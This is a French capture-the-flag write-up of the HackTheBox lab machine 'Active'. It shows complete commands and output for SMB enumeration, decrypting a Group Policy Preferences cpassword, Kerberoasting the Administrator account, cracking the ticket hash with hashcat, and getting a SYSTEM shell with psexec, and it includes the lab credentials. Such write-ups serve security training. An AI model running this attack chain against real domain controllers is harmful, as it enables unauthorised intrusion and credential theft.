---
title: HTB | Active
description: Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.
slug: active-htb
date: 2025-01-05 00:00:00+0000
#image: cover.png
categories:
    - HackTheBox
tags:
    - Windows
    - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Active cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Active</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.100</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
SVC_TGS       : GPPstillStandingStrong2k18
Administrator : Ticketmaster1968
```

## Version
`Windows Server 2008 R2 SP1`

## Enumeration

### nmap

```bash
nmap -sC -sV -An -p- 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 17:12 EST
Nmap scan report for 10.10.10.100
Host is up (0.027s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-12 22:12:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-12T22:13:57
|_  start_date: 2024-12-12T22:09:06
```

### enu4mlinux
```bash
[+] Got OS info for 10.10.10.100 from srvinfo:                                                                                                                                                                                     
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller                                                                                                                                                                      
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b
                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.10.100 )=================================
                                                                                                                                                                                                                                   
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100

//10.10.10.100/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                  
//10.10.10.100/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$     Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users    Mapping: DENIED Listing: N/A Writing: N/A
```

## Foothold

### SMB Share "Replication"
En fouillant le SMB share "replication" accessible avec un utilisateur anonyme, on trouve un fichier intéressant parmis les autres:
- Groups.xml

Il semble contenir un mot de passe chiffré.

**Explication de ChatGPT** :

Le mot de passe chiffré dans le champ cpassword que vous montrez est très probablement encodé en AES-256-CBC et fait partie d'une configuration XML de stratégie de groupe Windows (Group Policy Preferences, ou GPP). Ces cpassword sont généralement liés à des configurations de comptes d'utilisateurs déployés via les GPP.

### GPP Exploitation
On déchiffre le mot de passe, ce qui nous donne : `GPPstillStandingStrong2k18`
Le username associé est également donné dans le xml : `SVC_TGS`
```bash
smbclient --no-pass //10.10.10.100/Replication
...

┌──(kali㉿kali)-[~]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"                                                             
GPPstillStandingStrong2k18
```

### user flag - SMB Share Users
En scannat a nouveau les shares SMB, cette fois-ci avec notre user/password obtenu, on voit qu'on a acces au share "Users" en readonly. On y trouve un dossier
avec le nom de notre utilisateur et tous ces fichiers Windows, avec le flag user.txt :
> 1fc4.....a676
```bash
┌──(kali㉿kali)-[~/htb/Active/bloodhound1]
└─$ smbclient //10.10.10.100/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 278586 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

                5217023 blocks of size 4096. 278586 blocks available
                         
┌──(kali㉿kali)-[~/htb/Active/bloodhound1]
└─$ sudo mount -t cifs -o username='SVC_TGS',password='GPPstillStandingStrong2k18' //10.10.10.100/Users/SVC_TGS /mnt/smb

┌──(kali㉿kali)-[~/htb/Active/bloodhound1]
└─$ xdg-open /mnt/smb             
```

## Privilege Escalation

### Kerberoasting Attack on SPN 'CIFS'
Cette commande exécute l'outil `GetUserSPNs.py` de la suite Impacket pour récupérer les **Service Principal Names** (SPN) configurés dans l'Active Directory, liés à des comptes de service. Ici, nous vérifions s'il existe un SPN qui pourrait être exploité pour effectuer une attaque de **Kerberoasting**.
```bash
$ impacket-GetUserSPNs active.htb/SVC_TGS:"GPPstillStandingStrong2k18" -dc-ip 10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-01-04 07:30:15.825757
```
L'option -request permet de demander un **ticket TGS** (Ticket Granting Service) pour les **SPN** trouvés. Ce ticket est ensuite extrait sous forme de hash Kerberos, qui pourra être craqué hors ligne. 
```bash
$ impacket-GetUserSPNs active.htb/SVC_TGS:"GPPstillStandingStrong2k18" -request -dc-ip 10.10.10.100

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-01-04 07:30:15.825757             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8852493078c2a4f352f6468b34dcd243$38b8aa13f6ffb46cd7866c10ab7d0dc3a54117cfe4cd271fba599fa52f84b826cb94edda0fada6c386721fa3edfc10cf58b23c35cfdbd409e42d9ba81b84cab539fb285d561f7a8c15f3ee813eede43d56618635868377a8b9fe39c0708da79aebe14351a3bcf89b1d6f248a545a042772b27bd528c91df09e5b900df3b5188cd734316acd1416c63bf032540166f0e319db943dc7a099234da10956156f753927dafbb8f1c244df2b4a3c349f333a1cb6d26ae607a037b9a39a0f995f8ba811d7b8dfc58100c6b88b8493c1d85dee40d784f275c24184e727c3e55baa2fa233a28a820e5d04684b320b925588f9eb37568891bef410775ec5c001c0dbbe9b8b1acce9b7b55aa54b37367fabede080a6a270e5a79b49ff27f83f90da85a6bbe4a99210d6fb4a9d01faee68080243f6bc04131beb8111fceeedc87bbdd9168d95d3e15e262ed2a7a0bbda46c0a51bdbb32fc98bd81252f31f928e317b06a768ed51e75e58dc66b430f9638d2996944b324ea624be7fc9a24ff5b2cd4ab9ae0b156fc9747c8c7482b785815c46293b772f1d920c776b2a6aa2ab1bf815543ba5070381cd55f21b4c9b9a70172c3e637dad6e91c1e03651de9f8532e537119b2062f63c92a771ba8fe33b3ca7a674a204331d3f577bff722492b960c241a84c59f63b28b7eeba74c37db41f4d91215e3421d820b39b4a1dfd9477b885385c8bf578718ef8f8ca659818795dd182bc91f7e13afae7cf4e38cf9bb5f4e6530ec9ae3272873e706dd528e52bbedfd39de18621c71eed9556eaec0d53b7655a4b8ec5ee1e54b408f7416197e66ea5650b317deb4b50dda2d1164ce4e51d802e099dbed074edb67b9fa2cf90ae3535fbfad2be12fe224132132040e1e842355ad2783c07c376e2f97017cc84d266bb8127681edfdaae6fa0de25a3092fecb65860d22279a50db9c0f339f5ea4b21fa96007757b9099aca27c87e34403149179c77dcbe5e546db3960f768a2cccbff8fdb869b61c312357186bc803e56b76a503d9716549e53ada50aeb8eaf0018bed0449a63d4a69fb985eacb782f48e5f6c18603ce64ad7f5acc2046798a13de5c8da29e9ec5b763c63d19fdb9fc9d41fd6f704098ff0fda0220ea2ba32ada95eba169827ef9ad50c77475ef5dc45cc56063c28462a1a81786271ed6ae8505d3aca6b81aa9c1e9964a3dec3277a526a239241251a3c05bcbab5b30e596e23c189bcc442170b3b09a3e9f8b2e5d00cae47
```
Ce résultat correspond au hash TGS récupéré pour le compte Administrator.
```bash
» vim admin_hash.txt
» hashcat -m 13100 -a 0 admin_hash.txt  ~/wordlists/rockyou.txt
hashcat (v6.2.5) starting

Dictionary cache hit:
* Filename..: /home/leopold/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139922195
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8852493078c2a4f352f6468b34dcd243$38b8aa13f6ffb46cd7866c10ab7d0dc3a54117cfe4cd271fba599fa52f84b826cb94edda0fada6c386721fa3edfc10cf58b23c35cfdbd409e42d9ba81b84cab539fb285d561f7a8c15f3ee813eede43d56618635868377a8b9fe39c0708da79aebe14351a3bcf89b1d6f248a545a042772b27bd528c91df09e5b900df3b5188cd734316acd1416c63bf032540166f0e319db943dc7a099234da10956156f753927dafbb8f1c244df2b4a3c349f333a1cb6d26ae607a037b9a39a0f995f8ba811d7b8dfc58100c6b88b8493c1d85dee40d784f275c24184e727c3e55baa2fa233a28a820e5d04684b320b925588f9eb37568891bef410775ec5c001c0dbbe9b8b1acce9b7b55aa54b37367fabede080a6a270e5a79b49ff27f83f90da85a6bbe4a99210d6fb4a9d01faee68080243f6bc04131beb8111fceeedc87bbdd9168d95d3e15e262ed2a7a0bbda46c0a51bdbb32fc98bd81252f31f928e317b06a768ed51e75e58dc66b430f9638d2996944b324ea624be7fc9a24ff5b2cd4ab9ae0b156fc9747c8c7482b785815c46293b772f1d920c776b2a6aa2ab1bf815543ba5070381cd55f21b4c9b9a70172c3e637dad6e91c1e03651de9f8532e537119b2062f63c92a771ba8fe33b3ca7a674a204331d3f577bff722492b960c241a84c59f63b28b7eeba74c37db41f4d91215e3421d820b39b4a1dfd9477b885385c8bf578718ef8f8ca659818795dd182bc91f7e13afae7cf4e38cf9bb5f4e6530ec9ae3272873e706dd528e52bbedfd39de18621c71eed9556eaec0d53b7655a4b8ec5ee1e54b408f7416197e66ea5650b317deb4b50dda2d1164ce4e51d802e099dbed074edb67b9fa2cf90ae3535fbfad2be12fe224132132040e1e842355ad2783c07c376e2f97017cc84d266bb8127681edfdaae6fa0de25a3092fecb65860d22279a50db9c0f339f5ea4b21fa96007757b9099aca27c87e34403149179c77dcbe5e546db3960f768a2cccbff8fdb869b61c312357186bc803e56b76a503d9716549e53ada50aeb8eaf0018bed0449a63d4a69fb985eacb782f48e5f6c18603ce64ad7f5acc2046798a13de5c8da29e9ec5b763c63d19fdb9fc9d41fd6f704098ff0fda0220ea2ba32ada95eba169827ef9ad50c77475ef5dc45cc56063c28462a1a81786271ed6ae8505d3aca6b81aa9c1e9964a3dec3277a526a239241251a3c05bcbab5b30e596e23c189bcc442170b3b09a3e9f8b2e5d00cae47:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...0cae47
Time.Started.....: Sun Jan  5 01:39:10 2025 (1 sec)
Time.Estimated...: Sun Jan  5 01:39:11 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/leopold/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7678.4 kH/s (9.15ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10616832/14344385 (74.01%)
Rejected.........: 0/10616832 (0.00%)
Restore.Point....: 10321920/14344385 (71.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ahki_22 -> Saboka54
Hardware.Mon.#1..: Temp: 36c Fan: 46% Util: 23% Core:1860MHz Mem:3802MHz Bus:16

Started: Sun Jan  5 01:39:09 2025
Stopped: Sun Jan  5 01:39:12 2025
```
On trouve le mot de passe de l'administrateur !
Administrator:`Ticketmaster1968`

On peut maintenant se connecter en SMB et accéder au dossier de l'adminstrateur dans le share "USERS" qui était bloqué auparavant. On obtient bien le flag root.txt.
```bash
$ smbclient //10.10.10.100/Users -U 'Administrator%Ticketmaster1968'
Try "help" to get a list of possible commands.
smb: \> cd Administrator\
smb: \Administrator\> ls
  .                                   D        0  Mon Jul 16 06:14:21 2018
  ..                                  D        0  Mon Jul 16 06:14:21 2018
  AppData                           DHn        0  Sat Jan  4 07:29:39 2025
  Application Data                DHSrn        0  Mon Jul 16 06:14:15 2018
  Contacts                           DR        0  Mon Jul 30 09:50:10 2018
  Cookies                         DHSrn        0  Mon Jul 16 06:14:15 2018
  Desktop                            DR        0  Thu Jan 21 11:49:47 2021
  Documents                          DR        0  Mon Jul 30 09:50:10 2018
  Downloads                          DR        0  Thu Jan 21 11:52:32 2021
  Favorites                          DR        0  Mon Jul 30 09:50:10 2018
  Links                              DR        0  Mon Jul 30 09:50:10 2018
  Local Settings                  DHSrn        0  Mon Jul 16 06:14:15 2018
  Music                              DR        0  Mon Jul 30 09:50:10 2018
  My Documents                    DHSrn        0  Mon Jul 16 06:14:15 2018
  NetHood                         DHSrn        0  Mon Jul 16 06:14:15 2018
  NTUSER.DAT                       AHSn   524288  Sat Jan  4 07:30:15 2025
  ntuser.dat.LOG1                   AHS   262144  Sat Jan  4 08:05:30 2025
  ntuser.dat.LOG2                   AHS        0  Mon Jul 16 06:14:09 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Mon Jul 16 06:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jul 16 06:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jul 16 06:14:15 2018
  ntuser.ini                         HS       20  Mon Jul 16 06:14:15 2018
  Pictures                           DR        0  Mon Jul 30 09:50:10 2018
  PrintHood                       DHSrn        0  Mon Jul 16 06:14:15 2018
  Recent                          DHSrn        0  Mon Jul 16 06:14:15 2018
  Saved Games                        DR        0  Mon Jul 30 09:50:10 2018
  Searches                           DR        0  Mon Jul 30 09:50:10 2018
  SendTo                          DHSrn        0  Mon Jul 16 06:14:15 2018
  Start Menu                      DHSrn        0  Mon Jul 16 06:14:15 2018
  Templates                       DHSrn        0  Mon Jul 16 06:14:15 2018
  Videos                             DR        0  Mon Jul 30 09:50:10 2018

                5217023 blocks of size 4096. 277230 blocks available
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> cat root.txt
cat: command not found
smb: \Administrator\Desktop\> get root.txt 
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \Administrator\Desktop\> 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Active/bloodhound2]
└─$ cat root.txt                  
5d2a.....fb20
```

### Administrator shell
Grâce à l'outil **psexec.py** de la suite Impacket, j'ai pu obtenir un shell interactif avec les privilèges les plus élevés (NT AUTHORITY\SYSTEM) sur la machine cible. Cela a été possible en utilisant les identifiants de l'utilisateur Administrator pour se connecter au partage **SMB ADMIN$**, uploader un exécutable temporaire, et créer un service Windows pour l'exécuter. Une fois le service démarré, un accès complet au système a été établi, permettant un contrôle total de la machine.
```bash
$ impacket-psexec Administrator:"Ticketmaster1968"@10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file lwoxkZvR.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service zfLo on 10.10.10.100.....
[*] Starting service zfLo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```